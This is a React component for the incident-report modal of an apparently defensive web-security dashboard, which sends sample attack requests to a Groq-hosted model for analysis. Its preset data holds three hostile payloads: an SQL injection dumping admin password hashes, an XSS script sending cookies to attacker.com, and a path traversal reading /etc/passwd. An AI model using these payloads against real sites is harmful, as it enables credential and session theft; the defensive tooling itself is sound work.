import React, { useState } from 'react';
import { 
  X, Sparkles, Copy, Check, RefreshCw, Flame, ShieldAlert, 
  Terminal, ShieldCheck, Download, ExternalLink, Zap
} from 'lucide-react';
import ReactMarkdown from 'react-markdown';
import { generateReport } from '../api';

export default function GroqReportModal({ isOpen, onClose }) {
  const [loading, setLoading] = useState(false);
  const [report, setReport] = useState(null);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(false);
  const [selectedPreset, setSelectedPreset] = useState('sqli');

  const presets = [
    {
      id: 'sqli',
      label: 'SQL Injection Exploit',
      payload: {
        request_string: "GET /admin/users?search=' UNION SELECT id, username, password_hash FROM admin_credentials -- HTTP/1.1\nHost: store.webguard.local\nUser-Agent: sqlmap/1.6.10#stable",
        attack_probability: 0.998,
        behavior_score: 0.84,
        traffic_surge_index: 0.55,
        risk_score: 0.87,
        is_threat: true
      }
    },
    {
      id: 'xss',
      label: 'Cross-Site Scripting (XSS)',
      payload: {
        request_string: "POST /comments HTTP/1.1\nHost: store.webguard.local\nUser-Agent: Mozilla/5.0\nContent-Type: application/json\n\n{\"comment\": \"<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\"}",
        attack_probability: 0.965,
        behavior_score: 0.72,
        traffic_surge_index: 0.30,
        risk_score: 0.78,
        is_threat: true
      }
    },
    {
      id: 'lfi',
      label: 'Path Traversal / LFI',
      payload: {
        request_string: "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: store.webguard.local\nUser-Agent: WebScarab/2024",
        attack_probability: 0.982,
        behavior_score: 0.79,
        traffic_surge_index: 0.40,
        risk_score: 0.81,
        is_threat: true
      }
    }
  ];

  const handleGenerate = async (presetId = selectedPreset) => {
    setLoading(true);
    setError(null);
    try {
      const presetObj = presets.find(p => p.id === presetId) || presets[0];
      const data = await generateReport(presetObj.payload);
      setReport(data.report);
    } catch (err) {
      setError(err.response?.data?.error || err.message || 'Groq report generation failed');
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = () => {
    if (!report) return;
    navigator.clipboard.writeText(report);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownload = () => {
    if (!report) return;
    const blob = new Blob([report], { type: 'text/markdown;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', `WebGuard_Groq_Report_${Date.now()}.md`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-black/80 backdrop-blur-md animate-fade-in">
      <div className="relative w-full max-w-4xl max-h-[90vh] bg-[#0A0F1D] border border-blue-500/30 rounded-3xl shadow-2xl flex flex-col overflow-hidden">
        
        {/* Header */}
        <div className="p-5 sm:p-6 border-b border-white/[0.08] flex items-center justify-between bg-gradient-to-r from-blue-950/40 to-indigo-950/40">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center text-white shadow-lg shadow-blue-500/30">
              <Sparkles className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-lg font-bold text-white">Groq AI Incident Report Generator</h3>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-semibold bg-blue-500/10 text-cyan-400 border border-cyan-500/25">
                  Qwen-27B LLM
                </span>
              </div>
              <p className="text-xs text-gray-400">
                Generates Root Cause Analysis, MITRE ATT&CK mapping, and automated firewall rules.
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-2 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] text-gray-400 hover:text-white transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Preset Selector & Action Strip */}
        <div className="p-4 sm:p-5 border-b border-white/[0.06] bg-black/30 flex flex-wrap items-center justify-between gap-3">
          <div className="flex flex-wrap items-center gap-2">
            <span className="text-xs text-gray-400 font-medium mr-1">Select Incident:</span>
            {presets.map(p => (
              <button
                key={p.id}
                onClick={() => {
                  setSelectedPreset(p.id);
                  handleGenerate(p.id);
                }}
                className={`px-3 py-1.5 rounded-xl text-xs font-semibold transition-all ${
                  selectedPreset === p.id
                    ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30'
                    : 'bg-white/[0.04] text-gray-400 hover:text-white hover:bg-white/[0.07]'
                }`}
              >
                {p.label}
              </button>
            ))}
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => handleGenerate(selectedPreset)}
              disabled={loading}
              className="flex items-center gap-2 px-4 py-1.5 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white text-xs font-semibold shadow-md shadow-blue-600/20 transition-all disabled:opacity-50"
            >
              {loading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Zap className="w-3.5 h-3.5 text-amber-300" />}
              <span>{loading ? 'Generating...' : 'Regenerate with Groq'}</span>
            </button>

            {report && (
              <>
                <button
                  onClick={handleCopy}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.09] text-gray-200 text-xs font-medium border border-white/[0.08] transition-all"
                >
                  {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-cyan-400" />}
                  <span>{copied ? 'Copied' : 'Copy'}</span>
                </button>
                <button
                  onClick={handleDownload}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.09] text-gray-200 text-xs font-medium border border-white/[0.08] transition-all"
                >
                  <Download className="w-3.5 h-3.5 text-indigo-400" />
                  <span className="hidden sm:inline">Download .MD</span>
                </button>
              </>
            )}
          </div>
        </div>

        {/* Content Body */}
        <div className="flex-1 overflow-y-auto p-5 sm:p-6 space-y-4">
          {error && (
            <div className="p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs">
              <strong>Error:</strong> {error}
            </div>
          )}

          {!report && !loading && (
            <div className="py-16 text-center space-y-4">
              <div className="w-16 h-16 rounded-3xl bg-blue-500/10 text-cyan-400 border border-cyan-500/20 flex items-center justify-center mx-auto">
                <Flame className="w-8 h-8 text-amber-400" />
              </div>
              <div>
                <h4 className="text-base font-bold text-white">Ready to Generate Groq Security Report</h4>
                <p className="text-xs text-gray-400 max-w-md mx-auto mt-1">
                  Click the button below to feed live security telemetry into the Groq cloud model and generate an incident analysis report.
                </p>
              </div>
              <button
                onClick={() => handleGenerate(selectedPreset)}
                className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-indigo-600 to-cyan-500 text-white font-bold text-xs shadow-lg shadow-blue-600/30 hover:scale-105 transition-all"
              >
                Generate Security Report Now
              </button>
            </div>
          )}

          {loading && (
            <div className="py-20 text-center space-y-3">
              <RefreshCw className="w-8 h-8 text-cyan-400 animate-spin mx-auto" />
              <div className="text-sm font-semibold text-gray-200">
                Groq AI is analyzing incident telemetry...
              </div>
              <div className="text-xs text-gray-400 font-mono">
                Querying Groq Cloud (`qwen/qwen3.8-27b`) • Synthesizing MITRE ATT&CK & Firewall Rules
              </div>
            </div>
          )}

          {report && !loading && (
            <div className="prose prose-invert max-w-none text-gray-200 text-xs sm:text-sm leading-relaxed space-y-4 [&_h1]:text-lg [&_h1]:font-bold [&_h1]:text-cyan-400 [&_h2]:text-base [&_h2]:font-bold [&_h2]:text-white [&_h2]:border-b [&_h2]:border-white/[0.08] [&_h2]:pb-1.5 [&_h3]:text-sm [&_h3]:font-semibold [&_h3]:text-indigo-300 [&_table]:w-full [&_table]:text-xs [&_th]:border-b [&_th]:border-gray-700 [&_th]:py-2 [&_th]:px-3 [&_th]:text-left [&_th]:text-cyan-300 [&_td]:border-b [&_td]:border-white/[0.05] [&_td]:py-2 [&_td]:px-3 [&_pre]:bg-[#05070D] [&_pre]:border [&_pre]:border-white/[0.08] [&_pre]:rounded-2xl [&_pre]:p-4 [&_code]:text-xs [&_code]:font-mono [&_code]:text-cyan-200">
              <ReactMarkdown>{report}</ReactMarkdown>
            </div>
          )}
        </div>

      </div>
    </div>
  );
}
